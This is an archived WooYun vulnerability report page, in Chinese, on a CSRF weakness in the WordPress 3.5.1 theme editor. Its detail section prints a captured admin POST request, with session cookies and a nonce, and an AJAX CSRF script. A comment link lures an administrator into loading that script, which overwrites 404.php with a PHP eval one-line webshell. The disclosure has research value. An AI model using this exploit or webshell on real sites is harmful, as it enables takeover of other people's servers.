@@ -1,0 +1,216 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		wordpress后台CSRF不严，管理员访问某些链接可拿shell  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		wordpress后台CSRF不严，管理员访问某些链接可拿shell  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/小贱人">小贱人</a> 
+</li><li>提交时间：		2013-03-29 12:43</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-03-29：	积极联系厂商并且等待厂商认领中，细节不对外公开<br/>
+									2013-06-27：	厂商已经主动忽略漏洞，细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">wordpress3.5.1后台修改主题模版处防CSRF不严，前台评论可加入超链接，可写上诱惑性东西 骗取管理员点击后写入一句话木马</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">进入后台-外观-编辑。选择编辑Twenty Twelve主题下的404.php文件。将原内容去掉，换成一句话木马，同时打开抓包工具。<br />
+<br />
+</p><p class="detail"><a href="../images/29124121a1bebd758bd76501110f72b046a3ff49.png" target="_blank"><img src="../images/29124121a1bebd758bd76501110f72b046a3ff49.png" alt="1.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+更新后抓到包 <br />
+<br />
+</p><pre><code>post http://localhost/wp/wp-admin/theme-editor.php<br />
+Host: localhost<br />
+User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:19.0) Gecko/20100101 Firefox/19.0<br />
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br />
+Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3<br />
+Accept-Encoding: gzip, deflate<br />
+Referer: http://localhost/wp/wp-admin/theme-editor.php?file=404.php&amp;theme=twentytwelve<br />
+Cookie: wordpress_1233097993469c07c80a9cb529880b71=admin%7C1364700254%7Cb875aa22d9bb88383aa6f9b1628dd86b; wp-settings-time-1=1364445495; comment_author_1233097993469c07c80a9cb529880b71=test; comment_author_email_1233097993469c07c80a9cb529880b71=632117384%40qq.com; wp-settings-1=editor%3Dhtml; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_1233097993469c07c80a9cb529880b71=admin%7C1364700254%7C082956c79c01926f6f107ccd131dade7; s5wJ_2132_saltkey=uNFgCP80; s5wJ_2132_lastvisit=1364366389; s5wJ_2132_ulastactivity=591affdyS6zMRtF88Jad%2BTVr47oX95MIizEQOFn8RMF%2BN%2FpUUHdw<br />
+Connection: keep-alive<br />
+Content-Type: application/x-www-form-urlencoded<br />
+Content-Length: 268<br />
+_wpnonce=b6cda66293&amp;_wp_http_referer=%2Fwp%2Fwp-admin%2Ftheme-editor.php%3Ffile%3D404.php%26theme%3Dtwentytwelve&amp;newcontent=%3C%3Fphp+eval%28%24_GET%5Ba%5D%29%3B%3F%3E&amp;action=update&amp;file=404.php&amp;theme=twentytwelve&amp;scrollto=0&amp;submit=%E6%9B%B4%E6%96%B0%E6%96%87%E4%BB%B6</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+由于本地演示，用AJAX进行CSRF攻击。<br />
+<br />
+编写localhost/wp.html文件。内容为<br />
+<br />
+</p><pre><code>&lt;script&gt;<br />
+function CreateRquest(){<br />
+var httpRequest;<br />
+try{<br />
+httpRequest=new ActiveXObject(&quot;Msxml2.XMLHTTP&quot;);<br />
+}catch(e){<br />
+try{<br />
+httpRequest=new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);<br />
+}catch(e1){<br />
+httpRequest=new XMLHttpRequest();<br />
+}<br />
+}<br />
+return httpRequest;<br />
+}<br />
+var request=CreateRquest();<br />
+request.open(&quot;post&quot;,&quot;http://localhost/wp/wp-admin/theme-editor.php&quot;,true);<br />
+request.setRequestHeader(&quot;Content-Type&quot;,&quot;application/x-www-form-urlencoded&quot;);<br />
+var a=&quot;_wpnonce=b6cda66293&amp;_wp_http_referer=%2Fwp%2Fwp-admin%2Ftheme-editor.php%3Ffile%3D404.php%26theme%3Dtwentytwelve&amp;newcontent=&lt;?php eval($_GET[a]);?&gt;&amp;action=update&amp;file=404.php&amp;theme=twentytwelve&amp;scrollto=0&amp;submit=%E6%9B%B4%E6%96%B0%E6%96%87%E4%BB%B6&quot;;<br />
+request.send(a);<br />
+&lt;/script&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+将被修改的404.PHP恢复，并且在前台评论写入&lt;a href=&quot;http://localhost/wp.html&quot;&gt;管理员，有一篇文章也讲到了这个问题<br />
+<br />
+管理员登录后台查看评论。点击链接后 <br />
+<br />
+Twenty Twelve主题下的404.php已被成功修改为一句话木马<br />
+<br />
+</p><p class="detail"><a href="../images/29124317ad708d377c5506ce1880e4c5a6bddc7a.png" target="_blank"><img src="../images/29124317ad708d377c5506ce1880e4c5a6bddc7a.png" alt="2.png" width="600"/></a></p><p class="detail"><br />
+<br />
+访问一句话木马<br />
+<br />
+</p><p class="detail"><a href="../images/29124325e0f73b0e76caf08aff3eb54fc7f41614.png" target="_blank"><img src="../images/29124325e0f73b0e76caf08aff3eb54fc7f41614.png" alt="3.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+攻击成功，AJAX仅为演示，实战中可用JS控制表单自动提交来实现跨域传输数据。 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">管理员点击相关链接后，成功在404页面写入一句话木马 并访问成功<br />
+<br />
+</p><p class="detail"><a href="../images/291145555d5a59a95882b882f6392d0cbcb9c090.jpg" target="_blank"><img src="../images/291145555d5a59a95882b882f6392d0cbcb9c090.jpg" alt=".jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+AJAX仅为本地测试用，实战中可在恶意页面中用JS控制表单自动提交。 </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">你们比我懂 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/小贱人" title="小贱人">小贱人</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-020878" title="wordpress后台CSRF不严，管理员访问某些链接可拿shell">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+									<h3 class="detailTitle">厂商回应：</h3>
+										<p class="detail">未能联系到厂商或者厂商积极拒绝</p>
+																<p class="detail">漏洞Rank：4 (WooYun评价)</p>
+												
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="20878";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
